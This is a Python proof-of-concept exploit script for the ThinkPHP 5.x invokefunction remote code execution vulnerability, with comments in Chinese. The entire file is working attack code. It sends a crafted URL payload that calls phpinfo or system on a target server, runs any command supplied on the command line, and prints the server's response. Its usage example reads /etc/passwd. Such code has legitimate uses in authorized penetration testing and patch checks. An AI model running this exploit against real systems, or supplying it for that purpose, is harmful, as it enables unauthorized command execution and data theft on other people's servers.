#!/usr/bin/env python3
"""
ThinkPHP 5.x invokefunction RCE PoC
Usage: 
  python thinkphp_invoke_rce.py http://target:8080              # 默认执行 phpinfo 探测
  python thinkphp_invoke_rce.py http://target:8080 "id"         # 执行系统命令
"""

import sys
import requests
import urllib.parse

def test_phpinfo(target):
    """执行 phpinfo 确认漏洞存在"""
    # 构造 payload，注意反斜杠在 URL 中会编码为 %5C
    payload_path = "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
    url = target.rstrip("/") + payload_path
    try:
        resp = requests.get(url, timeout=10)
        if "PHP Version" in resp.text or "phpinfo()" in resp.text:
            print("[+] Target is vulnerable! (phpinfo found in response)")
            return True
        else:
            print("[-] phpinfo not found in response, may not be vulnerable or debug info disabled.")
            print("Response snippet:", resp.text[:300])
            return False
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False

def execute_command(target, cmd):
    """执行任意系统命令并返回响应（可能无回显）"""
    # 使用 system 函数执行命令
    payload_path = "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%s" % urllib.parse.quote(cmd)
    url = target.rstrip("/") + payload_path
    print(f"[*] Sending command: {cmd}")
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Response status: {resp.status_code}")
        if resp.text:
            # 过滤掉模板或者无关 HTML，尝试提取命令输出
            # 实际环境中输出可能直接嵌入在页面中
            print("[+] Response body:")
            print(resp.text)
        else:
            print("[!] Empty response, command may have been executed blindly.")
    except Exception as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [command]")
        print(f"Example: {sys.argv[0]} http://192.168.1.100:8080")
        print(f"         {sys.argv[0]} http://192.168.1.100:8080 'cat /etc/passwd'")
        sys.exit(1)

    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else None

    if cmd:
        # 如果提供了命令，直接尝试执行（跳过 phpinfo 测试）
        execute_command(target, cmd)
    else:
        # 默认测试漏洞存在性
        test_phpinfo(target)